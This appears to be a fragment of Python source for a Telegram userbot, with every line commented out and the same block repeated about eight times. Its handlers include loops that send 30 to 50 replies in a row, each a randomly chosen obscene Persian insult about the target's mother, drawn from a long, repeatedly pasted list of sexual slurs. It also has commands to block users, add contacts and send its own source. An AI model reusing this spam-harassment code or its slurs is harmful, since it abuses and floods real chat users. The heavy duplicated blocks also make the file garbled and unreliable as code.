			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)